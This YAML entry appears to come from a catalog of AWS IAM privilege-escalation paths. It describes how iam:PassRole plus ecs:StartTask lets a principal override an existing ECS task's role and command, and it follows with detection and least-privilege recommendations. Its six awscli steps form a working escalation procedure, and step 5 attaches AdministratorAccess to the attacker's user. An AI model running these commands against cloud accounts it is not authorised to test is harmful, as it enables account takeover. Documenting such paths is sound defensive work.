id: ecs-009
name: iam:PassRole + ecs:StartTask
category: new-passrole
services:
  - iam
  - ecs

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
    - permission: ecs:StartTask
      resourceConstraints: Must have permission to start tasks on an existing EC2 container instance in the target cluster; an existing task definition must be available to override
  additional:
    - permission: ecs:ListClusters
      resourceConstraints: Helpful for discovering available ECS clusters
    - permission: ecs:ListContainerInstances
      resourceConstraints: Required to retrieve the container instance ARN needed for the StartTask command
    - permission: ecs:ListTaskDefinitions
      resourceConstraints: Helpful for discovering existing task definitions to exploit with overrides
    - permission: ecs:DescribeTasks
      resourceConstraints: Helpful for monitoring task execution status
    - permission: ec2:DescribeSubnets
      resourceConstraints: Helpful for finding subnets if network configuration is needed
    - permission: ec2:DescribeSecurityGroups
      resourceConstraints: Helpful for finding security groups if network configuration is needed

description: A principal with `iam:PassRole` and `ecs:StartTask` can override an existing ECS task definition's container command and task role at runtime using the `--overrides` parameter, then start the task on an existing EC2 container instance — without needing `ecs:RegisterTaskDefinition` or `ecs:RegisterContainerInstance`. By overriding the `taskRoleArn` with a privileged role (passed via `iam:PassRole`) and the container command with a malicious payload, the attacker causes the task to execute arbitrary code with the passed role's permissions. This is the EC2 launch type equivalent of ECS-008, and a lower-permission variant of ECS-005 that removes the requirement for `ecs:RegisterTaskDefinition`.

prerequisites:
  admin:
    - An ECS cluster must exist with at least one registered EC2 container instance
    - An existing task definition must be available in the cluster (no ecs:RegisterTaskDefinition required)
    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
    - An ECS cluster must exist with at least one registered EC2 container instance
    - An existing task definition must be available in the cluster
    - A role must exist that trusts ecs-tasks.amazonaws.com

exploitationSteps:
  awscli:
    - step: 1
      command: aws sts get-caller-identity
      description: Get your account ID and verify identity before proceeding
    - step: 2
      command: |
        aws ecs list-clusters \
          --query 'clusterArns' \
          --output json
      description: Discover available ECS clusters in the account
    - step: 3
      command: |
        aws ecs list-container-instances \
          --cluster CLUSTER_NAME \
          --query 'containerInstanceArns[0]' \
          --output text
      description: Retrieve the container instance ARN from the target cluster — this is required for the StartTask command (unlike RunTask, StartTask requires specifying an EC2 container instance)
    - step: 4
      command: |
        aws ecs list-task-definitions \
          --query 'taskDefinitionArns' \
          --output json
      description: Discover existing task definitions to hijack with the --overrides parameter — no new task definition registration required
    - step: 5
      command: |
        aws ecs start-task \
          --cluster CLUSTER_NAME \
          --task-definition EXISTING_TASK_DEFINITION \
          --container-instances CONTAINER_INSTANCE_ARN \
          --overrides '{
            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
            "containerOverrides": [{
              "name": "CONTAINER_NAME",
              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
            }]
          }'
      description: Start the existing task definition on the target EC2 container instance, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the starting principal's privileges
    - step: 6
      command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```


  - Monitor CloudTrail for `ecs:StartTask` calls with a `taskRoleArn` in the `overrides` field — this is the specific API pattern that enables this attack
  - Monitor CloudTrail for ECS task execution by principals who do not usually start tasks
  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
  - Monitor and alert on ECS task execution with privileged roles
  - Regularly audit ECS task definitions for overly permissive defaults — if existing task definitions can be started with any role via overrides, that is the attack surface
  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.

  This path requires an existing EC2 container instance registered to the ECS cluster. Unlike ECS-008 (Fargate via ecs:RunTask), this path uses the EC2 launch type and requires specifying a container instance ARN. It cannot be used to start Fargate tasks. If no container instance exists in the cluster, ECS-007 demonstrates how `ecs:RegisterContainerInstance` can be used to register one.

